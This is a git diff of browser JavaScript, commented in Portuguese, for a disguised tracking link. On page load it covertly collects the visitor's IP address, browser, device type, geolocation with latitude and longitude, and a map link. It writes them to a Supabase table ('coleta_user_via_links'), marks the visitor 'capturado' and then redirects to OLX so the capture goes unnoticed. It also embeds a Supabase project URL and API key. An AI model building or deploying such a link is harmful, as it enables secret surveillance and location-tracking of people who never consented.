@@ -2,7 +2,7 @@
 const SUPABASE_URL = "https://dpfqhkjnirudtxuivhcg.supabase.co";
 const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwZnFoa2puaXJ1ZHR4dWl2aGNnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTMwMDg1ODYsImV4cCI6MjA2ODU4NDU4Nn0.5NrF4nArELAGAkwjLOQNCdq-p1TLUIhZRN4XtZiJ7DI";
 
-// Inicializa o cliente Supabase corretamente
+// Inicializa o cliente Supabase
 const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
 document.addEventListener("DOMContentLoaded", () => {
@@ -40,43 +40,54 @@ document.addEventListener("DOMContentLoaded", () => {
                 aparelho = "Computador";
             }
 
+            // Detecta navegador
+            let navegador = "Desconhecido";
+            if (/chrome/i.test(userAgent)) navegador = "Chrome";
+            else if (/firefox/i.test(userAgent)) navegador = "Firefox";
+            else if (/safari/i.test(userAgent)) navegador = "Safari";
+            else if (/edge/i.test(userAgent)) navegador = "Edge";
+            else if (/opera/i.test(userAgent)) navegador = "Opera";
+
             // Busca a investigação atual
-            const { data: investigacao } = await supabaseClient
-                .from("coleta_olx")
-                .select("redirecionamento, acessos")
+            const { data: investigacao, error: fetchError } = await supabaseClient
+                .from("coleta_user_via_links")  // Nome correto da tabela
+                .select("redirecionamento, acessos, status")
                 .eq("id", investigacaoId)
                 .single();
 
-            if (!investigacao) {
-                console.error("Investigação não encontrada");
+            if (fetchError || !investigacao) {
+                console.error("Investigação não encontrada:", fetchError);
                 window.location.href = "https://www.olx.com.br";
                 return;
             }
 
             // Atualiza os dados da investigação
-            const { error } = await supabaseClient
-                .from("coleta_olx")
+            const { error: updateError } = await supabaseClient
+                .from("coleta_user_via_links")  // Nome correto da tabela
                 .update({
                     ip: ip,
-                    navegador: userAgent,
-                    geolocalizacao,
+                    navegador: navegador,
+                    geolocalizacao: geolocalizacao,
                     aparelho: aparelho,
                     data_hora: new Date().toISOString(),
-                    latitude,
-                    longitude,
-                    mapa_link,
-                    acessos: (investigacao.acessos || 0) + 1
+                    latitude: latitude,
+                    longitude: longitude,
+                    mapa_link: mapa_link,
+                    acessos: (investigacao.acessos || 0) + 1,
+                    status: 'capturado'  // Atualiza o status
                 })
                 .eq("id", investigacaoId);
 
-            if (error) {
-                console.error("Erro ao atualizar no Supabase:", error);
+            if (updateError) {
+                console.error("Erro ao atualizar no Supabase:", updateError);
             } else {
                 console.log("Dados coletados com sucesso");
             }
 
             // Redireciona para o link configurado ou OLX por padrão
-            window.location.href = investigacao.redirecionamento || "https://www.olx.com.br";
+            setTimeout(() => {
+                window.location.href = investigacao.redirecionamento || "https://www.olx.com.br";
+            }, 500); // Pequeno delay para garantir que os dados foram salvos
 
         } catch (err) {
             console.error("Erro geral na coleta:", err);
